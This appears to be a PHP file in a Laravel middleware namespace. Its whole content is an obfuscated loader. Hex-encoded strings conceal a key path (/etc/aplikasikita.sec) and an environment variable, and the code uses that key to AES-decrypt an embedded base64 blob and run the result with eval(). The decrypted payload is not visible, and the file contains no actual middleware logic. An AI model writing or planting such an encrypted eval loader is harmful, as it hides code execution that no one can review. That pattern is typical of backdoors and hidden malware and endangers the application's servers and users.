<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('KNBaoZvz5KhqpIIt35R7Bg==');

$c=base64_decode(

'ZIbOuF6q8feMith1DQBiuK7fRIQoPrWAOiD+zLEiaLsMRS2TbC5hze1yNosGJx232OXbNlrc4eFT' .
'IBZTrdqpwsuVG82pp6v/jpkjno5q9LInbC4+2VmYbStBgaSBIfd/6jr+FngF5ZpL+YM5ZaNTLnSJ' .
'ywmQx815FkWk3xuPOChG47TK+MuXzaWLvtr8K6C+4PC+DvYiBTTrvjgy+bZHdD+3RomNJhBMycUs' .
'kroEuNlKDJMevsXw0sgSV/cYlaQvJjzuLKItPhtigqp2wmmCFVGfsXBtNyUVO1Umzo8T+rIPeMik' .
'BjEP0t75jX55h3WhqNXHWmCzCrE9WZFBHj57AdAaMsKi6S7rUFFfiO7OqNMp2nlIm5tGuW4mZh07' .
'MKoOuWBLaCfLNfI0gwRADgFTiCQTcFxShdaSh9SM86XvnjnWDrcpXycbnqhxCLn4XhKQqA6M6VEA' .
'3qikkq3kwV1vST2t45QO+XGoOFkRPId1aNmYK9t4hfQtQ/P5y6iiywJDGMS4OJe7NVR/rfqWej8e' .
'qVs8zzVopapgV3e5jNpRyQEDCv9KV1S5uKxNq6yGYtFbHTs40V0JYvra6UjV0HteFb+ulZ/uHqWS' .
'BVC7kStV+Ji1OZGOBUf+S/kMyK4FwHpYsUDMaRsNmaYrarezif50CaWRlsO9NXT2osiiEZFPiB9R' .
'vRHSnCW4H6Lwh+mlqRUdxKe2XUaZ/puJggxS9q/nAdJFYjVs8XkrdRfYzUrNBhaUcx5v0ro2jrx7' .
'e7Apo+JKNa85I7ZKlQfy3JaDVmARVtjtruESVYyPi0p6kew89dMCePhNOr61wVrS6z1Yl2bfMaXr' .
'ih4WF+faNOQ6S3r7Ifm+YCIpyrsnoM/+3DWimBVUpYDbiEItvcyW+82U+It2VM4h4VyMkTm37SJb' .
'txVFkNrTXaLz0q5dX3Ued3oQa28/AcKA6CpNb1M834EXVPu3IkuUpEbN4PxIRMHli0qQb1Cx+AB9' .
'pc0lvm8seScAgCBvLi/LFpT+E8cJXz/ydKdWLf2p4XUWdHD6DDHXI2PkChRofDf2iWH5zBiQUbsG' .
'5pAUjt9cClecHfEvvRySFWeRLlfx205nv9O5YJzkaoUJWtOENZs/w1GWioARnOv5Pvz9HC3kQlF3' .
'6TncCAkuclUPke/LZSd7Rqe6JgRSQb+tyCmAfPV6q6BSyeEs1JEsGYqrTfODFpRvMGKJUdWdZj91' .
'y8GR7L62Z7MF/I7lYQa5jfwngj+OndSlxOi0B6/iMX0vQvHYxVJFOdDvWHAsSZ74+ZbxEa74Z8KC' .
'baZmF+XUqT5hbMZHCNhEUK2fdxM1Hp6xp3ZD8yurg+u4OPtxmrvx8ycdgRhxIZvK9gWXr+WBgWCH' .
't4mjpMLoU+suC7TBkYr6Sp0XC2cAP6kEsYKEfUNIPoEQkByX7UaDcvTz0EtATjZwOUQqFaSsKcg1' .
'dWo29rxjmbGgNdrYWRqbYuXkqJjhPS0bfIhsnSnFAc2bgzh1WIe/FAjvo3PAHF4WLe3TM7CJXcpo' .
'yjVTU8zQDXBQB9HeTMdJu5+hcDGs0wkYbx9RSg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

